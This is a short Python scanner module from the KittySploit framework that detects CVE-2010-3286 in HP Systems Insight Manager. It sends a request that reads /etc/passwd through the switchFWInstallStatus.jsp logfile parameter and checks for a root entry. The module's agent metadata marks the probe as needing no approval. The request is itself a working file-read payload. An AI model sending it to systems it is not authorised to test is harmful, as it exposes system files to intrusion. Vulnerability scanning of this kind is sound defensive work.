#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2010-3286 via HEAD switchFWInstallStatus."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HP Systems Insight Manager - logfile File Read Detection (CVE-2010-3286)',
        'description': (
            'Detects CVE-2010-3286 via HEAD switchFWInstallStatus.jsp?logfile=/etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'hp', 'sim', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-3286',
        ],
        'cve': 'CVE-2010-3286',
    }

    def run(self):
        path = '/mxportal/taskandjob/switchFWInstallStatus.jsp?logfile=/etc/passwd'
        r = self.http_request(method='HEAD', path=path, allow_redirects=False)
        body = ''
        if r:
            body = (r.text or '') + ' '.join(f'{k}:{v}' for k, v in (r.headers or {}).items())
        if re.search(r'root:.*:0:0:', body):
            self.set_info(severity='high', reason='HP SIM logfile file read (CVE-2010-3286)', path='/mxportal/taskandjob/switchFWInstallStatus.jsp')
            return True
        # some servers put file body in HEAD response entity
        r2 = self.http_request(method='GET', path=path, allow_redirects=False)
        if r2 and re.search(r'root:.*:0:0:', r2.text or ''):
            self.set_info(severity='high', reason='HP SIM logfile file read (CVE-2010-3286)', path='/mxportal/taskandjob/switchFWInstallStatus.jsp')
            return True
        return False

